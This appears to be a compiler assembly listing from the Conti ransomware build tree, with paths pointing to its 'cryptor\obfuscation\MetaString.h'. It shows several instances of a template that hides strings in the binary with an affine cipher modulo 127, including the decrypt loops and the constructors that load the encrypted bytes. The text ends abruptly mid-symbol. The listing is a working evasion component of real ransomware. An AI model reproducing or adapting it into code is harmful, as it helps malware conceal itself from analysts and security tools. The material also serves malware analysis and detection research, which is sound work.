  0000e	41 ba 0e 00 00
	00		 mov	 r10d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 28 00 00 00	 mov	 eax, 40			; 00000028H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6c	 mov	 BYTE PTR [rcx+1], 108	; 0000006cH
  00007	c6 41 02 28	 mov	 BYTE PTR [rcx+2], 40	; 00000028H
  0000b	c6 41 03 54	 mov	 BYTE PTR [rcx+3], 84	; 00000054H
  0000f	c6 41 04 28	 mov	 BYTE PTR [rcx+4], 40	; 00000028H
  00013	c6 41 05 62	 mov	 BYTE PTR [rcx+5], 98	; 00000062H
  00017	c6 41 06 28	 mov	 BYTE PTR [rcx+6], 40	; 00000028H
  0001b	c6 41 07 62	 mov	 BYTE PTR [rcx+7], 98	; 00000062H
  0001f	c6 41 08 28	 mov	 BYTE PTR [rcx+8], 40	; 00000028H
  00023	c6 41 09 69	 mov	 BYTE PTR [rcx+9], 105	; 00000069H
  00027	c6 41 0a 28	 mov	 BYTE PTR [rcx+10], 40	; 00000028H
  0002b	c6 41 0b 62	 mov	 BYTE PTR [rcx+11], 98	; 00000062H
  0002f	c6 41 0c 28	 mov	 BYTE PTR [rcx+12], 40	; 00000028H
  00033	c6 41 0d 28	 mov	 BYTE PTR [rcx+13], 40	; 00000028H
  00037	c6 41 0e 28	 mov	 BYTE PTR [rcx+14], 40	; 00000028H
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0e 00 00
	00		 mov	 r10d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 03 00 00 00	 mov	 eax, 3
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 01	 mov	 BYTE PTR [rcx+1], 1
  00007	c6 41 02 03	 mov	 BYTE PTR [rcx+2], 3
  0000b	c6 41 03 36	 mov	 BYTE PTR [rcx+3], 54	; 00000036H
  0000f	c6 41 04 03	 mov	 BYTE PTR [rcx+4], 3
  00013	c6 41 05 4c	 mov	 BYTE PTR [rcx+5], 76	; 0000004cH
  00017	c6 41 06 03	 mov	 BYTE PTR [rcx+6], 3
  0001b	c6 41 07 4c	 mov	 BYTE PTR [rcx+7], 76	; 0000004cH
  0001f	c6 41 08 03	 mov	 BYTE PTR [rcx+8], 3
  00023	c6 41 09 57	 mov	 BYTE PTR [rcx+9], 87	; 00000057H
  00027	c6 41 0a 03	 mov	 BYTE PTR [rcx+10], 3
  0002b	c6 41 0b 41	 mov	 BYTE PTR [rcx+11], 65	; 00000041H
  0002f	c6 41 0c 03	 mov	 BYTE PTR [rcx+12], 3
  00033	c6 41 0d 03	 mov	 BYTE PTR [rcx+13], 3
  00037	c6 41 0e 03	 mov	 BYTE PTR [rcx+14], 3
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 78	 sub	 ecx, 120		; 00000078H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 59	 mov	 BYTE PTR [rcx+1], 89	; 00000059H
  00007	c6 41 02 78	 mov	 BYTE PTR [rcx+2], 120	; 00000078H
  0000b	c6 41 03 60	 mov	 BYTE PTR [rcx+3], 96	; 00000060H
  0000f	c6 41 04 78	 mov	 BYTE PTR [rcx+4], 120	; 00000078H
  00013	c6 41 05 19	 mov	 BYTE PTR [rcx+5], 25
  00017	c6 41 06 78	 mov	 BYTE PTR [rcx+6], 120	; 00000078H
  0001b	c6 41 07 77	 mov	 BYTE PTR [rcx+7], 119	; 00000077H
  0001f	c6 41 08 78	 mov	 BYTE PTR [rcx+8], 120	; 00000078H
  00023	c6 41 09 78	 mov	 BYTE PTR [rcx+9], 120	; 00000078H
  00027	c6 41 0a 78	 mov	 BYTE PTR [rcx+10], 120	; 00000078H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 61 00 00 00	 mov	 eax, 97			; 00000061H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 04	 mov	 BYTE PTR [rcx+1], 4
  00007	c6 41 02 61	 mov	 BYTE PTR [rcx+2], 97	; 00000061H
  0000b	c6 41 03 19	 mov	 BYTE PTR [rcx+3], 25
  0000f	c6 41 04 61	 mov	 BYTE PTR [rcx+4], 97	; 00000061H
  00013	c6 41 05 42	 mov	 BYTE PTR [rcx+5], 66	; 00000042H
  00017	c6 41 06 61	 mov	 BYTE PTR [rcx+6], 97	; 00000061H
  0001b	c6 41 07 42	 mov	 BYTE PTR [rcx+7], 66	; 00000042H
  0001f	c6 41 08 61	 mov	 BYTE PTR [rcx+8], 97	; 00000061H
  00023	c6 41 09 61	 mov	 BYTE PTR [rcx+9], 97	; 00000061H
  00027	c6 41 0a 61	 mov	 BYTE PTR [rcx+10], 97	; 00000061H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<3,18,std::integer_sequence<unsigned 